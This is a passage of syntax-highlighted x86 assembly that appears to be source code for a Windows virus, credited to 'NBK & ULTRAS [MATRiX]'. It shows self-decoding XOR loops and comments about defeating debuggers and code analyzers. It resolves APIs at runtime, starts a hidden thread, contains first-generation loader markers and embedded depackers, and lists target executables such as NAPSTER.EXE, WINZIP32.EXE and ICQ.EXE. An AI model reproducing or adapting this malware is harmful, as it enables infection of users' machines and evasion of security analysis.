   </span><span class="sc5">_main_list</span><span class="sc4">:</span><span class="sc0">

   </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">

   </span><span class="sc5">_main_li0</span><span class="sc4">:</span><span class="sc0">

   </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">
   </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">ebp</span><span class="sc0">
   </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">fx_GetProcAddress</span><span class="sc0">

   </span><span class="sc6">test</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
   </span><span class="sc6">jnz</span><span class="sc0"> </span><span class="sc5">_main_li2</span><span class="sc0">
   </span><span class="sc6">add</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">6</span><span class="sc0">  </span><span class="sc1">;  the old api values could be still working</span><span class="sc0">
   </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">_main_li1</span><span class="sc0">

   </span><span class="sc5">_main_li2</span><span class="sc4">:</span><span class="sc0">

   </span><span class="sc6">stosd</span><span class="sc0">
   </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc0">
   </span><span class="sc6">inc</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc0">

   </span><span class="sc5">_main_li1</span><span class="sc4">:</span><span class="sc0">

   </span><span class="sc6">lodsb</span><span class="sc0">
   </span><span class="sc6">test</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc0">
   </span><span class="sc6">jnz</span><span class="sc0"> </span><span class="sc5">_main_li1</span><span class="sc0">
   </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc12">'X'</span><span class="sc0">
   </span><span class="sc6">cmp</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">al</span><span class="sc0">
   </span><span class="sc6">jne</span><span class="sc0"> </span><span class="sc5">_main_li0</span><span class="sc0">

   </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">_entry</span><span class="sc0">

   </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc12">'LL'</span><span class="sc0">
   </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc12">'D.23'</span><span class="sc0">
   </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc12">'RESU'</span><span class="sc0">
   </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">esp</span><span class="sc0">
   </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">fx_LoadLibrary</span><span class="sc0">

   </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc12">'Axo'</span><span class="sc0">
   </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc12">'Bega'</span><span class="sc0">
   </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc12">'sseM'</span><span class="sc0">
   </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">esp</span><span class="sc0">
   </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
   </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc5">fx_GetProcAddress</span><span class="sc0">
   </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">+(</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">call_MessageBoxA</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">_entry</span><span class="sc4">)+</span><span class="sc2">1</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">

   </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
   </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">esp</span><span class="sc0">
   </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
   </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
   </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc0">
   </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
   </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
   </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">+(</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">call_CreateThread</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">_entry</span><span class="sc4">)]</span><span class="sc0">
   </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">

   </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc5">THREAD_PRIORITY_LOWEST</span><span class="sc0">
   </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
   </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">+(</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">call_SetThreadPriority</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">_entry</span><span class="sc4">)]</span><span class="sc0">
   </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">

</span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc10">$</span><span class="sc0">

   </span><span class="sc1">;  this will fuck some debuggers</span><span class="sc0">

   </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc2">1</span><span class="sc0">
   </span><span class="sc6">lea</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">edi</span><span class="sc4">+(</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">call_ExitThread</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">_entry</span><span class="sc4">)]</span><span class="sc0">
   </span><span class="sc6">call</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">

   </span><span class="sc5">_main_l0</span><span class="sc4">:</span><span class="sc0">   </span><span class="sc1">;  let's fuck some code analyzers...</span><span class="sc0">

   </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">esi</span><span class="sc0">
   </span><span class="sc6">lodsd</span><span class="sc0">
   </span><span class="sc6">mov</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
   </span><span class="sc6">not</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
   </span><span class="sc6">stosd</span><span class="sc0">

   </span><span class="sc5">_main_l1</span><span class="sc4">:</span><span class="sc0">

   </span><span class="sc6">lodsd</span><span class="sc0">
   </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc0">
   </span><span class="sc6">xor</span><span class="sc0"> </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0">
   </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ebx</span><span class="sc0">
   </span><span class="sc6">stosd</span><span class="sc0">
   </span><span class="sc6">loop</span><span class="sc0"> </span><span class="sc5">_main_l1</span><span class="sc0">
   </span><span class="sc6">ret</span><span class="sc0">

   </span><span class="sc5">fx_LoadLibrary</span><span class="sc4">:</span><span class="sc0">

   </span><span class="sc1">;  imgbase + .idata rva + loadlibrary</span><span class="sc0">

   </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">0b8h</span><span class="sc0">
   </span><span class="sc5">_api_loadlibrary</span><span class="sc0"> </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">00400000h</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">idata_rva</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">34h</span><span class="sc0">
   </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">eax</span><span class="sc4">]</span><span class="sc0">

   </span><span class="sc5">fx_GetProcAddress</span><span class="sc4">:</span><span class="sc0">

   </span><span class="sc1">;  imgbase + .idata rva + getprocaddress</span><span class="sc0">

   </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">0b8h</span><span class="sc0">
   </span><span class="sc5">_api_getprocaddress</span><span class="sc0"> </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc2">00400000h</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc5">idata_rva</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc2">38h</span><span class="sc0">
   </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">eax</span><span class="sc4">]</span><span class="sc0">

   </span><span class="sc9">include</span><span class="sc0"> </span><span class="sc5">_depack.INC</span><span class="sc0">

   </span><span class="sc9">align</span><span class="sc0"> </span><span class="sc2">4</span><span class="sc0">

   </span><span class="sc5">_main_loader_end</span><span class="sc0"> </span><span class="sc9">label</span><span class="sc0">
   </span><span class="sc5">_main_loader_size</span><span class="sc0"> </span><span class="sc9">equ</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">_main_loader_end</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">_main_loader</span><span class="sc4">)</span><span class="sc0">

   </span><span class="sc1">;  ;  ;  ;  ;  ;  ;  ;  ;  ;  ;  ;  ;  ;  ;  ;  ;  ;  ;  ;  ;</span><span class="sc0">
   </span><span class="sc1">;                                                           ;</span><span class="sc0">
   </span><span class="sc1">;  CODE AND DATA AFTER HERE WILL EXIST ONLY IN FIRST VERSION;</span><span class="sc0">
   </span><span class="sc1">;                                                           ;</span><span class="sc0">
   </span><span class="sc1">;  ;  ;  ;  ;  ;  ;  ;  ;  ;  ;  ;  ;  ;  ;  ;  ;  ;  ;  ;  ;</span><span class="sc0">

   </span><span class="sc5">entry</span><span class="sc4">:</span><span class="sc0">

   </span><span class="sc1">; first generation header</span><span class="sc0">

   </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc5">FIRST_VERSION_KERNEL</span><span class="sc0">
   </span><span class="sc6">pop</span><span class="sc0"> </span><span class="sc8">ebp</span><span class="sc0">
   </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">_entry</span><span class="sc0">
   </span><span class="sc6">push</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">_entry</span><span class="sc0">
   </span><span class="sc6">jmp</span><span class="sc0"> </span><span class="sc5">_main_add_api</span><span class="sc0">

   </span><span class="sc1">;  ;  ;  ;  ;  ;  ;  ;  ;  ;  ;  ;  ;  ;  ;  ;  ;  ;  ;  ;  ;  ;</span><span class="sc0">
   </span><span class="sc1">;                                                              ;</span><span class="sc0">
   </span><span class="sc1">;  CODE AND DATA BEFORE HERE WILL EXIST ONLY IN FIRST VERSION  ;</span><span class="sc0">
   </span><span class="sc1">;                                                              ;</span><span class="sc0">
   </span><span class="sc1">;  ;  ;  ;  ;  ;  ;  ;  ;  ;  ;  ;  ;  ;  ;  ;  ;  ;  ;  ;  ;  ;</span><span class="sc0">

   </span><span class="sc9">.data</span><span class="sc0">

   </span><span class="sc5">v_name</span><span class="sc0"> </span><span class="sc9">label</span><span class="sc0">

   </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc12">'SABi¡ II'</span><span class="sc4">,</span><span class="sc2">13</span><span class="sc4">,</span><span class="sc2">10</span><span class="sc0">
   </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc12">'By: NBK &amp; ULTRAS [MATRiX]'</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">

   </span><span class="sc5">aplib@006</span><span class="sc0"> </span><span class="sc9">label</span><span class="sc0">

   </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">00dh</span><span class="sc4">,</span><span class="sc2">00ah</span><span class="sc4">,</span><span class="sc2">00dh</span><span class="sc4">,</span><span class="sc2">00ah</span><span class="sc4">,</span><span class="sc2">061h</span><span class="sc4">,</span><span class="sc2">050h</span><span class="sc4">,</span><span class="sc2">04ch</span><span class="sc4">,</span><span class="sc2">069h</span><span class="sc4">,</span><span class="sc2">062h</span><span class="sc4">,</span><span class="sc2">020h</span><span class="sc4">,</span><span class="sc2">076h</span><span class="sc4">,</span><span class="sc2">030h</span><span class="sc4">,</span><span class="sc2">02eh</span><span class="sc4">,</span><span class="sc2">032h</span><span class="sc4">,</span><span class="sc2">032h</span><span class="sc4">,</span><span class="sc2">062h</span><span class="sc0">
   </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">020h</span><span class="sc4">,</span><span class="sc2">020h</span><span class="sc4">,</span><span class="sc2">02dh</span><span class="sc4">,</span><span class="sc2">020h</span><span class="sc4">,</span><span class="sc2">020h</span><span class="sc4">,</span><span class="sc2">074h</span><span class="sc4">,</span><span class="sc2">068h</span><span class="sc4">,</span><span class="sc2">065h</span><span class="sc4">,</span><span class="sc2">020h</span><span class="sc4">,</span><span class="sc2">073h</span><span class="sc4">,</span><span class="sc2">06dh</span><span class="sc4">,</span><span class="sc2">061h</span><span class="sc4">,</span><span class="sc2">06ch</span><span class="sc4">,</span><span class="sc2">06ch</span><span class="sc4">,</span><span class="sc2">065h</span><span class="sc4">,</span><span class="sc2">072h</span><span class="sc0">
   </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">020h</span><span class="sc4">,</span><span class="sc2">074h</span><span class="sc4">,</span><span class="sc2">068h</span><span class="sc4">,</span><span class="sc2">065h</span><span class="sc4">,</span><span class="sc2">020h</span><span class="sc4">,</span><span class="sc2">062h</span><span class="sc4">,</span><span class="sc2">065h</span><span class="sc4">,</span><span class="sc2">074h</span><span class="sc4">,</span><span class="sc2">074h</span><span class="sc4">,</span><span class="sc2">065h</span><span class="sc4">,</span><span class="sc2">072h</span><span class="sc4">,</span><span class="sc2">020h</span><span class="sc4">,</span><span class="sc2">03ah</span><span class="sc4">,</span><span class="sc2">029h</span><span class="sc4">,</span><span class="sc2">00dh</span><span class="sc4">,</span><span class="sc2">00ah</span><span class="sc0">
   </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">043h</span><span class="sc4">,</span><span class="sc2">06fh</span><span class="sc4">,</span><span class="sc2">070h</span><span class="sc4">,</span><span class="sc2">079h</span><span class="sc4">,</span><span class="sc2">072h</span><span class="sc4">,</span><span class="sc2">069h</span><span class="sc4">,</span><span class="sc2">067h</span><span class="sc4">,</span><span class="sc2">068h</span><span class="sc4">,</span><span class="sc2">074h</span><span class="sc4">,</span><span class="sc2">020h</span><span class="sc4">,</span><span class="sc2">028h</span><span class="sc4">,</span><span class="sc2">063h</span><span class="sc4">,</span><span class="sc2">029h</span><span class="sc4">,</span><span class="sc2">020h</span><span class="sc4">,</span><span class="sc2">031h</span><span class="sc4">,</span><span class="sc2">039h</span><span class="sc0">
   </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">039h</span><span class="sc4">,</span><span class="sc2">038h</span><span class="sc4">,</span><span class="sc2">02dh</span><span class="sc4">,</span><span class="sc2">039h</span><span class="sc4">,</span><span class="sc2">039h</span><span class="sc4">,</span><span class="sc2">020h</span><span class="sc4">,</span><span class="sc2">062h</span><span class="sc4">,</span><span class="sc2">079h</span><span class="sc4">,</span><span class="sc2">020h</span><span class="sc4">,</span><span class="sc2">04ah</span><span class="sc4">,</span><span class="sc2">06fh</span><span class="sc4">,</span><span class="sc2">065h</span><span class="sc4">,</span><span class="sc2">072h</span><span class="sc4">,</span><span class="sc2">067h</span><span class="sc4">,</span><span class="sc2">065h</span><span class="sc4">,</span><span class="sc2">06eh</span><span class="sc0">
   </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">020h</span><span class="sc4">,</span><span class="sc2">049h</span><span class="sc4">,</span><span class="sc2">062h</span><span class="sc4">,</span><span class="sc2">073h</span><span class="sc4">,</span><span class="sc2">065h</span><span class="sc4">,</span><span class="sc2">06eh</span><span class="sc4">,</span><span class="sc2">020h</span><span class="sc4">,</span><span class="sc2">02fh</span><span class="sc4">,</span><span class="sc2">020h</span><span class="sc4">,</span><span class="sc2">04ah</span><span class="sc4">,</span><span class="sc2">069h</span><span class="sc4">,</span><span class="sc2">062h</span><span class="sc4">,</span><span class="sc2">07ah</span><span class="sc4">,</span><span class="sc2">02ch</span><span class="sc4">,</span><span class="sc2">020h</span><span class="sc4">,</span><span class="sc2">041h</span><span class="sc0">
   </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">06ch</span><span class="sc4">,</span><span class="sc2">06ch</span><span class="sc4">,</span><span class="sc2">020h</span><span class="sc4">,</span><span class="sc2">052h</span><span class="sc4">,</span><span class="sc2">069h</span><span class="sc4">,</span><span class="sc2">067h</span><span class="sc4">,</span><span class="sc2">068h</span><span class="sc4">,</span><span class="sc2">074h</span><span class="sc4">,</span><span class="sc2">073h</span><span class="sc4">,</span><span class="sc2">020h</span><span class="sc4">,</span><span class="sc2">052h</span><span class="sc4">,</span><span class="sc2">065h</span><span class="sc4">,</span><span class="sc2">073h</span><span class="sc4">,</span><span class="sc2">065h</span><span class="sc4">,</span><span class="sc2">072h</span><span class="sc4">,</span><span class="sc2">076h</span><span class="sc0">
   </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">065h</span><span class="sc4">,</span><span class="sc2">064h</span><span class="sc4">,</span><span class="sc2">00dh</span><span class="sc4">,</span><span class="sc2">00ah</span><span class="sc4">,</span><span class="sc2">00dh</span><span class="sc4">,</span><span class="sc2">00ah</span><span class="sc4">,</span><span class="sc2">054h</span><span class="sc4">,</span><span class="sc2">068h</span><span class="sc4">,</span><span class="sc2">069h</span><span class="sc4">,</span><span class="sc2">073h</span><span class="sc4">,</span><span class="sc2">020h</span><span class="sc4">,</span><span class="sc2">063h</span><span class="sc4">,</span><span class="sc2">06fh</span><span class="sc4">,</span><span class="sc2">070h</span><span class="sc4">,</span><span class="sc2">079h</span><span class="sc4">,</span><span class="sc2">020h</span><span class="sc0">
   </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">06fh</span><span class="sc4">,</span><span class="sc2">066h</span><span class="sc4">,</span><span class="sc2">020h</span><span class="sc4">,</span><span class="sc2">061h</span><span class="sc4">,</span><span class="sc2">050h</span><span class="sc4">,</span><span class="sc2">04ch</span><span class="sc4">,</span><span class="sc2">069h</span><span class="sc4">,</span><span class="sc2">062h</span><span class="sc4">,</span><span class="sc2">020h</span><span class="sc4">,</span><span class="sc2">069h</span><span class="sc4">,</span><span class="sc2">073h</span><span class="sc4">,</span><span class="sc2">020h</span><span class="sc4">,</span><span class="sc2">066h</span><span class="sc4">,</span><span class="sc2">072h</span><span class="sc4">,</span><span class="sc2">065h</span><span class="sc4">,</span><span class="sc2">065h</span><span class="sc0">
   </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">020h</span><span class="sc4">,</span><span class="sc2">066h</span><span class="sc4">,</span><span class="sc2">06fh</span><span class="sc4">,</span><span class="sc2">072h</span><span class="sc4">,</span><span class="sc2">020h</span><span class="sc4">,</span><span class="sc2">06eh</span><span class="sc4">,</span><span class="sc2">06fh</span><span class="sc4">,</span><span class="sc2">06eh</span><span class="sc4">,</span><span class="sc2">02dh</span><span class="sc4">,</span><span class="sc2">070h</span><span class="sc4">,</span><span class="sc2">072h</span><span class="sc4">,</span><span class="sc2">06fh</span><span class="sc4">,</span><span class="sc2">066h</span><span class="sc4">,</span><span class="sc2">069h</span><span class="sc4">,</span><span class="sc2">074h</span><span class="sc4">,</span><span class="sc2">061h</span><span class="sc0">
   </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">062h</span><span class="sc4">,</span><span class="sc2">06ch</span><span class="sc4">,</span><span class="sc2">065h</span><span class="sc4">,</span><span class="sc2">020h</span><span class="sc4">,</span><span class="sc2">075h</span><span class="sc4">,</span><span class="sc2">073h</span><span class="sc4">,</span><span class="sc2">065h</span><span class="sc4">,</span><span class="sc2">02eh</span><span class="sc4">,</span><span class="sc2">00dh</span><span class="sc4">,</span><span class="sc2">00ah</span><span class="sc4">,</span><span class="sc2">00dh</span><span class="sc4">,</span><span class="sc2">00ah</span><span class="sc4">,</span><span class="sc2">046h</span><span class="sc4">,</span><span class="sc2">06fh</span><span class="sc4">,</span><span class="sc2">072h</span><span class="sc4">,</span><span class="sc2">020h</span><span class="sc0">
   </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">06dh</span><span class="sc4">,</span><span class="sc2">06fh</span><span class="sc4">,</span><span class="sc2">072h</span><span class="sc4">,</span><span class="sc2">065h</span><span class="sc4">,</span><span class="sc2">020h</span><span class="sc4">,</span><span class="sc2">069h</span><span class="sc4">,</span><span class="sc2">06eh</span><span class="sc4">,</span><span class="sc2">066h</span><span class="sc4">,</span><span class="sc2">06fh</span><span class="sc4">,</span><span class="sc2">072h</span><span class="sc4">,</span><span class="sc2">06dh</span><span class="sc4">,</span><span class="sc2">061h</span><span class="sc4">,</span><span class="sc2">074h</span><span class="sc4">,</span><span class="sc2">069h</span><span class="sc4">,</span><span class="sc2">06fh</span><span class="sc4">,</span><span class="sc2">06eh</span><span class="sc0">
   </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">03ah</span><span class="sc4">,</span><span class="sc2">020h</span><span class="sc4">,</span><span class="sc2">068h</span><span class="sc4">,</span><span class="sc2">074h</span><span class="sc4">,</span><span class="sc2">074h</span><span class="sc4">,</span><span class="sc2">070h</span><span class="sc4">,</span><span class="sc2">03ah</span><span class="sc4">,</span><span class="sc2">02fh</span><span class="sc4">,</span><span class="sc2">02fh</span><span class="sc4">,</span><span class="sc2">061h</span><span class="sc4">,</span><span class="sc2">070h</span><span class="sc4">,</span><span class="sc2">061h</span><span class="sc4">,</span><span class="sc2">063h</span><span class="sc4">,</span><span class="sc2">06bh</span><span class="sc4">,</span><span class="sc2">02eh</span><span class="sc4">,</span><span class="sc2">063h</span><span class="sc0">
   </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">06ah</span><span class="sc4">,</span><span class="sc2">062h</span><span class="sc4">,</span><span class="sc2">02eh</span><span class="sc4">,</span><span class="sc2">06eh</span><span class="sc4">,</span><span class="sc2">065h</span><span class="sc4">,</span><span class="sc2">074h</span><span class="sc4">,</span><span class="sc2">02fh</span><span class="sc4">,</span><span class="sc2">00dh</span><span class="sc4">,</span><span class="sc2">00ah</span><span class="sc4">,</span><span class="sc2">00dh</span><span class="sc4">,</span><span class="sc2">00ah</span><span class="sc4">,</span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc2">000h</span><span class="sc4">,</span><span class="sc2">000h</span><span class="sc0">
   </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">04fh</span><span class="sc4">,</span><span class="sc2">01bh</span><span class="sc4">,</span><span class="sc2">079h</span><span class="sc4">,</span><span class="sc2">029h</span><span class="sc4">,</span><span class="sc2">0ebh</span><span class="sc4">,</span><span class="sc2">0c9h</span><span class="sc4">,</span><span class="sc2">0e5h</span><span class="sc4">,</span><span class="sc2">042h</span><span class="sc4">,</span><span class="sc2">0a5h</span><span class="sc4">,</span><span class="sc2">040h</span><span class="sc4">,</span><span class="sc2">0ceh</span><span class="sc4">,</span><span class="sc2">0b0h</span><span class="sc4">,</span><span class="sc2">011h</span><span class="sc4">,</span><span class="sc2">0edh</span><span class="sc4">,</span><span class="sc2">02ch</span><span class="sc4">,</span><span class="sc2">024h</span><span class="sc0">
   </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">035h</span><span class="sc4">,</span><span class="sc2">060h</span><span class="sc4">,</span><span class="sc2">07dh</span><span class="sc4">,</span><span class="sc2">0b4h</span><span class="sc4">,</span><span class="sc2">0d4h</span><span class="sc4">,</span><span class="sc2">029h</span><span class="sc4">,</span><span class="sc2">001h</span><span class="sc4">,</span><span class="sc2">080h</span><span class="sc4">,</span><span class="sc2">039h</span><span class="sc4">,</span><span class="sc2">0ffh</span><span class="sc4">,</span><span class="sc2">0b2h</span><span class="sc4">,</span><span class="sc2">080h</span><span class="sc4">,</span><span class="sc2">0c8h</span><span class="sc4">,</span><span class="sc2">039h</span><span class="sc4">,</span><span class="sc2">09ch</span><span class="sc4">,</span><span class="sc2">01ch</span><span class="sc0">

   </span><span class="sc5">array@001</span><span class="sc0">  </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">NAPSTER</span><span class="sc0">
              </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">GETRIGHT</span><span class="sc0">
              </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">WINZIP32</span><span class="sc0">
              </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">EUDORA</span><span class="sc0">
              </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">WINRAR</span><span class="sc0">
              </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">W32DSM89</span><span class="sc0">
              </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">WZSEPE32</span><span class="sc0">
              </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">WSCRIPT</span><span class="sc0">
              </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">ICQ</span><span class="sc0">
   </span><span class="sc5">array@002</span><span class="sc0">  </span><span class="sc9">label</span><span class="sc0">

   </span><span class="sc5">NAPSTER</span><span class="sc0">    </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc12">'NAPSTER.EXE'</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
   </span><span class="sc5">GETRIGHT</span><span class="sc0">   </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc12">'GETRIGHT.EXE'</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
   </span><span class="sc5">WINZIP32</span><span class="sc0">   </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc12">'WINZIP32.EXE'</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
   </span><span class="sc5">EUDORA</span><span class="sc0">     </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc12">'EUDORA.EXE'</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
   </span><span class="sc5">WINRAR</span><span class="sc0">     </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc12">'WINRAR.EXE'</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
   </span><span class="sc5">W32DSM89</span><span class="sc0">   </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc12">'W32DSM89.EXE'</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
   </span><span class="sc5">WZSEPE32</span><span class="sc0">   </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc12">'WZSEPE32.EXE'</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
   </span><span class="sc5">WSCRIPT</span><span class="sc0">    </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc12">'WSCRIPT.EXE'</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">
   </span><span class="sc5">ICQ</span><span class="sc0">        </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc12">'ICQ.EXE'</span><span class="sc4">,</span><span class="sc2">0</span><span class="sc0">

   </span><span class="sc9">include</span><span class="sc0"> </span><span class="sc5">_arj.INC</span><span class="sc0">   </span><span class="sc1">;   (c)Vecna</span><span class="sc0">

   </span><span class="sc5">_fixed_data_s2</span><span class="sc0"> </span><span class="sc9">label</span><span class="sc0">

   </span><span class="sc9">.data?</span><span class="sc0">

   </span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">10000</span><span class="sc0"> </span><span class="sc9">dup</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc10">?</span><span class="sc4">)</span><span class="sc0">

   </span><span class="sc5">_save_esp</span><span class="sc0">   </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">
   </span><span class="sc5">_save_eip</span><span class="sc0">   </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">
   </span><span class="sc5">_save_cs</span><span class="sc0">    </span><span class="sc9">dd</span><span class="sc0"> </span><span class="sc10">?</span><span class="sc0">

